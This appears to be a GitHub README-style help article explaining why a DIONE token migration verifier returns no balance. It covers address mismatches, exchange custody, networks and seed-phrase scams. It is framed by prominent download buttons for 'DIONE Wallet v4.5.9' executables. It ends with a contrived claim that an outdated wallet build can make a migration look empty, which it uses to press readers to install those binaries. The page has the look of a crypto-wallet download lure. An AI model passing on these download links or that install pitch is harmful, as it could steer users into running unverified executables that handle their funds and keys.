![DIONE Wallet](assets/banner-article.png)

# DIONE Migration Verifier Shows No Balance

<p align="center">A read-only lookup and an empty answer</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

The migration verifier is a read-only lookup: you paste the address that held ERC-20 DIONE and it reports what the migration record says for that address. No balance usually means the address was not in the snapshot, the address is not the one that held the tokens, or the holding was never on-chain in the first place.

## What the verifier actually is

A lookup tool, not a wallet action. It does not move funds, does not need a signature, and cannot be used to claim anything. You give it an address and it reads a record.

That framing matters because it sets the boundaries of what a "no balance" result can mean. The tool is reporting on a historical record; a blank answer is a statement about that record, not about your wallet today.

## The three reasons an address comes back empty

**The address held nothing at the snapshot.** If the tokens were on an exchange, the exchange held them in its own addresses, and your personal address never appeared in the snapshot. Your claim is with the exchange, not with the verifier.

**You are checking a different address.** A second wallet, a different account in the same wallet, or an address you copied from somewhere are all easy to confuse. Compare the address character by character against the one that received the tokens.

**The tokens were not ERC-20 on Ethereum.** The migration concerned Ethereum ERC-20 balances. DIONE bought elsewhere, or held on a chain that was not part of the migration, is a different case entirely.

## Checking the address properly

Four steps, and the first three catch most cases:

1. Find the transaction where you received the tokens, and copy the recipient address from the explorer rather than from memory.
2. Confirm the network on that transaction - it should be Ethereum for ERC-20 DIONE.
3. Paste that exact address into the verifier, with no spaces, and with the same capitalisation you copied.
4. If it is still empty, check whether the tokens were ever at an address you controlled, or whether an exchange held them.

Step four is where the answer usually is. A purchase on an exchange that never withdrew to a self-custody address has no personal address in the snapshot, and no amount of retrying the verifier will change that.

## What to do when the verifier is empty

The route depends on the cause, so establish it first:

- **Held on an exchange at the snapshot:** contact the exchange. The conversion was theirs to perform, and the record they hold is the one that matters.
- **Held in self-custody but not recognised:** verify the network and the exact address, then follow the currently published migration route rather than an older guide.
- **Tokens bought after the migration:** they are ERC-20 and were never in the snapshot. They convert through the migration route, not through the verifier.

[Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) sets out the migration as a whole, including the 1:1 ratio and why the timing matters.

## Why the verifier cannot move your tokens

It has no keys, no signing step and no transaction to approve. A tool that offers to "complete" a migration for you, asks for a seed phrase, or requests a signature to release a balance is not the verifier - it is the scam pattern described in [Spot a Fake DIONE Site or Support Scam](https://github.com/dione-protocol/keys-and-transfers/blob/main/spot-a-fake-dione-site.md).

This is worth repeating because the pressure is real: someone whose balance looks missing is exactly the person a convincing fake will target. The genuine check is a lookup with no wallet connection at all.

## Where the balance should appear afterwards

If the verifier reports a migrated balance, the native DIONE lives on Odyssey Chain. To see it, the wallet must be pointed at that network - chain ID 153153 - rather than at Ethereum.

That is the most common follow-up confusion: the verifier says yes, and the wallet shows nothing, because the wallet is still on the wrong chain. [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md) covers the switch, and [DIONE Wallet Transaction Failed: Read the Error, Then Act](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-transaction-failed.md) the explorer check that confirms the balance independently.

## If the tokens are still ERC-20

A balance that was never migrated stays an ERC-20 token on Ethereum. It is not lost, and it does not need a rescue - it needs the migration route, done deliberately: small test first, confirm arrival, then the rest.

Do not send ERC-20 DIONE to an Odyssey Chain address and expect it to convert. A transfer between chains is not a migration, and the token contract does not know about the destination chain.

## Bridging is a different tool

The bridge moves assets between chains and is used repeatedly; the migration was a one-time conversion. Confusing the two leads to transfers that arrive as wrapped assets rather than as native DIONE.

[Bridge DIONE to Odyssey Chain With Wanchain](https://github.com/dione-protocol/keys-and-transfers/blob/main/bridge-dione-to-odyssey-with-wanchain.md) covers the bridge and when it is the right instrument.

## Recording the result

Whichever route applies, keep the evidence: the address you checked, what the verifier said, and the transaction hashes for anything you moved. If a balance is later disputed, that record is the difference between a claim and an assertion.

It also protects you from repeating the work. A verifier result is a snapshot of a record, not a live view of your wallet, and the two can differ for reasons that have nothing to do with the migration.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The verifier is a published lookup, and the wallet is what shows the resulting balance - so a build that is behind can make a successful migration look empty. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding anything from a blank screen.

## FAQ

### Why does the DIONE migration verifier show no balance?

Usually the address was not in the snapshot because an exchange held the tokens, the address checked is not the one that received them, or the tokens are not Ethereum ERC-20.

### Can the verifier move my tokens?

No. It is read-only: no keys, no signature, no transaction. Anything asking for a seed phrase to "release" a balance is a scam.

### Where is my DIONE after a successful migration?

On Odyssey Chain, chain ID 153153. If the verifier says yes and the wallet shows nothing, the wallet is pointed at the wrong network.

### Do I need the verifier if I hold native DIONE?

No. A balance that is already native needs no migration and no lookup, whatever a site may claim.

### What if my tokens were on an exchange during the migration?

The exchange held them and converted them on its side. Your record is with the exchange, and the verifier will not show your personal address.

A blank verifier result is a statement about a historical record, not a verdict on your funds. The migration itself is in [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md), the network switch in [Add Another Network to DIONE Wallet](https://github.com/dione-protocol/keys-and-transfers/blob/main/add-another-network-to-dione-wallet.md), and the bridge - a different tool entirely - in [Bridge DIONE to Odyssey Chain With Wanchain](https://github.com/dione-protocol/keys-and-transfers/blob/main/bridge-dione-to-odyssey-with-wanchain.md).
